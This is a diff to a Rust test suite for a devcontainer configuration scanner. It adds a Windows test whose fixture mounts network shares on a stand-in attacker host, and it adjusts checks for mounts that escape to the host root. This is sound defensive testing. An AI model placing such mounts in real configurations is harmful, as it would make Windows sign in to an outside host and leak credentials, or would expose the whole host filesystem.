@@ -414,6 +414,27 @@ fn hostile_config_is_flagged() {
     assert_eq!(p.risks[0].level, Level::Danger, "dangers first");
 }
 
+/// A bind source on another computer is flagged from its text alone: resolving it would make
+/// Windows sign in to that host.
+#[cfg(windows)]
+#[test]
+fn network_bind_sources_are_flagged_without_being_opened() {
+    let d = project(&[(
+        ".devcontainer/devcontainer.json",
+        r#"{"image": "alpine", "mounts": ["source=\\\\attacker.invalid\\share\\x,target=/x,type=bind", "source=//attacker.invalid/share,target=/y,type=bind"]}"#,
+    )]);
+    let root = d.path();
+    let c = config::load(root, ".devcontainer/devcontainer.json", LocalEnv::Keep).unwrap();
+    let p = plan::build(root, c, b"", &engines(true, false));
+    for target in ["/x", "/y"] {
+        assert!(
+            p.risks.iter().any(|r| r.level == Level::Danger && r.message.contains("network path or a device") && r.message.contains(target)),
+            "{target}: {:#?}",
+            p.risks
+        );
+    }
+}
+
 #[test]
 fn escapes_through_links_parents_and_features_are_flagged() {
     let d = project(&[
@@ -441,7 +462,15 @@ fn escapes_through_links_parents_and_features_are_flagged() {
     let p = plan::build(root, c.clone(), b"", &engines(true, false));
     let danger = |needle: &str| p.risks.iter().any(|r| r.level == Level::Danger && r.item.contains(needle));
     assert!(danger("workspaceMount"), "{:#?}", p.risks);
-    assert!(p.risks.iter().any(|r| r.item.contains("rootlink") && r.message.contains("whole host filesystem")), "{:#?}", p.risks);
+    // Unix follows the link to `/`. Windows does not follow a link to a rooted path without a
+    // drive (it cannot tell `\` from a device path such as `\Device\Mup\…`) and flags the
+    // mount all the same.
+    let through_rootlink = if cfg!(windows) { "network path or a device" } else { "whole host filesystem" };
+    assert!(
+        p.risks.iter().any(|r| r.level == Level::Danger && r.item.contains("rootlink") && r.message.contains(through_rootlink)),
+        "{:#?}",
+        p.risks
+    );
     assert!(danger("-v /:/h"), "{:#?}", p.risks);
     assert!(p.risks.iter().any(|r| r.item == "-p 8080:80" && r.level == Level::Warning));
     assert!(danger("feature ./local: privileged"), "{:#?}", p.risks);
